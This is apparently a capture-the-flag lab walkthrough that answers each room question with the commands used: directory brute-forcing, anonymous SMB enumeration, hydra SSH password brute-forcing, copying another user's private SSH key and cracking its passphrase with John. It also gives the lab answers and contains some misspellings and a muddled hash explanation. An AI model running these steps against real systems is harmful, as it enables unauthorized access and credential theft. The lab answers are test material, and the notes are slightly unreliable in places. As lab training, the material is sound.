# basic penetrasi

## Task 1 Web App Testing and Privilege Escalation
- deploy
- Find the services exposed by the machine
- What is the name of the hidden directory on the web server(enter name without /)? development
  ```
  gobuster dir -u http://10.10.10.1 -w directory.txt -t 50

  /development
  ```
- User brute-forcing to find the username & password
- What is the username? jan
  ```
  enum4linux 10.10.10.1 | tee enum.log
    > anonymous, and ipc$

  smbclient //10.10.10.1/anonymous
    smb> get staff.txt
  ```
- What is the password?
  ```
  hydra -l jan -P rockyou.txt ssh://10.10.10.1 -T 100
  
  armando
  ```
- What service do you use to access the server(answer in abbreviation in all caps)? ssh
- Enumerate the machine to find any vectors for privilege escalation
  ```
  enumLinux.sh # jan
  ```
- What is the name of the other user you found(all lower case)? kay
  ```
  # jan
  ls /home
  cd /home/kay
  cd .ssh
  copy text id_rsa
  
  # kali
  nano id_rsa
  locate ssh2j

  /usr/share/john/ssh2john2.py id_rsa > hash.txt
  cat hash.txt
    check first line: sshng$1$

  open linux shadow hash
    $1$ is MD5

  jhon hash.txt --worldlist=/usr/share/worldlist/rockyou.txt
    pass = beeswax (id_rsa)
  ```
- If you have found another user, what can you do with this information?
- What is the final password you obtain? heresareallystrongpasswordthatfollowsthepasswordpolicy$$
  ```
  # jan
  ssh -i id_rsa kay@10.10.74.242
    beeswax

  cat pass.bax
  heresareallystrongpasswordthatfollowsthepasswordpolicy$$
  ```